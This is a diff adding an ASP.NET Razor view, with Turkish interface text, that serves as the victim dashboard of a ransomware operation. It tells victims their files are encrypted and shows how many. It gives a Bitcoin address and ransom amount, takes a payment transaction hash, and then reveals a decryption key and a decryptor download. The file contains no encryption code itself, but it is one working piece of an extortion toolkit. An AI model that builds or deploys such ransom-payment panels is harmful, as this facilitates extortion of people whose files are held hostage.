@@ -1,0 +1,112 @@
+@model VictimDashboard
+@{
+    ViewData["Title"] = "Dashboard";
+}
+
+<div class="container mt-4">
+    @if (TempData["Success"] != null)
+    {
+        <div class="alert alert-success alert-dismissible fade show" role="alert">
+            @TempData["Success"]
+            <button type="button" class="btn-close" data-bs-dismiss="alert" aria-label="Close"></button>
+        </div>
+    }
+
+    <div class="card mb-4 border-danger">
+        <div class="card-header bg-danger text-white">
+            <h4 class="mb-0"><i class="fas fa-exclamation-triangle"></i> Önemli Uyarı</h4>
+        </div>
+        <div class="card-body">
+            <h5>Dosyalarınız şifrelendi!</h5>
+            <p>Toplam şifrelenen dosya sayısı: <strong>@Model.EncryptedFileCount</strong></p>
+            <p>Dosyalarınızı kurtarmak için Bitcoin ile ödeme yapmanız gerekmektedir.</p>
+        </div>
+    </div>
+
+    <div class="row">
+        <div class="col-md-6">
+            <div class="card mb-4">
+                <div class="card-header">
+                    <h5 class="mb-0">Ödeme Bilgileri</h5>
+                </div>
+                <div class="card-body">
+                    <div class="mb-3">
+                        <label class="form-label">Bitcoin Adresi:</label>
+                        <div class="input-group">
+                            <input type="text" class="form-control" value="@Model.BitcoinAddress" readonly>
+                            <button class="btn btn-outline-secondary" type="button" onclick="copyToClipboard('@Model.BitcoinAddress')">
+                                <i class="fas fa-copy"></i>
+                            </button>
+                        </div>
+                    </div>
+                    <div class="mb-3">
+                        <label class="form-label">Ödeme Miktarı:</label>
+                        <input type="text" class="form-control" value="@Model.BitcoinAmount BTC" readonly>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <div class="col-md-6">
+            <div class="card mb-4">
+                <div class="card-header">
+                    <h5 class="mb-0">Ödeme Doğrulama</h5>
+                </div>
+                <div class="card-body">
+                    @if (TempData["ShowKey"] == null)
+                    {
+                        <form asp-action="VerifyPayment" method="post">
+                            @Html.AntiForgeryToken()
+                            <div class="mb-3">
+                                <label class="form-label">Transaction Hash:</label>
+                                <input type="text" name="transactionHash" class="form-control" required 
+                                       placeholder="Örnek: 1a2b3c4d5e6f...">
+                            </div>
+                            <button type="submit" class="btn btn-primary">Ödemeyi Doğrula</button>
+                        </form>
+                    }
+                    else
+                    {
+                        <div class="alert alert-success">
+                            <h5><i class="fas fa-key"></i> Decryption Key</h5>
+                            <div class="input-group mt-2">
+                                <input type="text" class="form-control" value="@Model.DecryptionKey" readonly>
+                                <button class="btn btn-outline-secondary" type="button" onclick="copyToClipboard('@Model.DecryptionKey')">
+                                    <i class="fas fa-copy"></i>
+                                </button>
+                            </div>
+                            <div class="mt-3">
+                                <a asp-action="DownloadDecryptor" class="btn btn-success">
+                                    <i class="fas fa-download"></i> Decryptor'ı İndir
+                                </a>
+                            </div>
+                        </div>
+                    }
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="card mb-4">
+        <div class="card-header">
+            <h5 class="mb-0">Şifrelenmiş Dosyalar</h5>
+        </div>
+        <div class="card-body">
+            <a asp-action="Files" class="btn btn-primary">
+                <i class="fas fa-file-alt"></i> Dosyaları Görüntüle
+            </a>
+        </div>
+    </div>
+</div>
+
+@section Scripts {
+    <script>
+        function copyToClipboard(text) {
+            navigator.clipboard.writeText(text).then(function() {
+                alert('Metin kopyalandı!');
+            }).catch(function(err) {
+                console.error('Kopyalama başarısız:', err);
+            });
+        }
+    </script>
+} 
